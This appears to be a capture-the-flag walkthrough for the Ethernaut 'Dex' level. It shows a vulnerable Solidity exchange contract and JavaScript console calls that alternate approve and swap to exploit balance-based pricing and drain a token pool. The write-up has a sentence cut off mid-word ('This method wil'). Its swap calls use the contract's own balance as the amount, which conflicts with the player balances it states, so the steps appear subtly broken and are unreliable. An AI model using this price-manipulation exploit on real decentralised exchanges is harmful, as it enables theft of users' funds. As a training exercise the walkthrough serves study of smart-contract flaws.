# Ethernaut Dex Level 22 Solution
This Project is a short walkthrough of the Ethernaut Dex level 22.

``` solidity
pragma solidity ^0.6.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import '@openzeppelin/contracts/math/SafeMath.sol';

contract Dex  {
  using SafeMath for uint;
  address public token1;
  address public token2;
  constructor(address _token1, address _token2) public {
    token1 = _token1;
    token2 = _token2;
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swap_amount = get_swap_price(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swap_amount);
    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
  }

  function add_liquidity(address token_address, uint amount) public{
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
  }
  function approve(address owner, address spender, uint amount) public returns(bool){
        super._approve(owner, spender, amount);
    }
}
```

You might want to read these articles before moving to the solution:
1. [ERC20 Approve/Allow Explained](https://medium.com/ethex-market/erc20-approve-allow-explained-88d6de921ce9)
2. [How does “swap” work between ERC20 tokens?](https://ethereum.stackexchange.com/a/92523/71430)

###Solution:
To solve this Level you only have to focus on this method:

```solidity
function get_swap_price(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }
```
The Initial balance of the contract for both tokens is 100.
`get_swap_price()` calculates the token price using the contract token balance. This method wil
```solidity
(amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this))
```
This will return the same swap price i.e 10 token1 can be swapped 10 token2. 

To hack this method you have to break the equilibrium of the contract token balance.

You have to perform the following steps to yield higher swap price

- call `approve()` with token2 balance
```javascript
await contract.approve(
  instance,
  Number((await contract.balanceOf(token2address, instance)).toString())
)
```  
- call `swap()` with these parameters
```javascript
  await contract.swap(
  token2address,
  token1address,
  Number((await contract.balanceOf(token2address, instance)).toString())
  )
```
- Now, Your token2 balance is 0 and token1 balance is 20. If you check the `get_swap_price()` You can get 24 token2 by swapping with 20 token1
- call `approve()` with token1 balance
```javascript
await contract.approve(
  instance,
  Number((await contract.balanceOf(token1address, instance)).toString())
)
```
- call `swap()` with these parameters
```javascript
  await contract.swap(
  token1address,
  token2address,
  Number((await contract.balanceOf(token1address, instance)).toString())
  )
```

Repeat these step until you reduced the contract balance of either token to 0.


(Note: You might get this error `ERC20: transfer amount exceeds balance`.
This is because the contract do not have enough balance for the token you are requesting. You can reduce the swap amount to handle this)
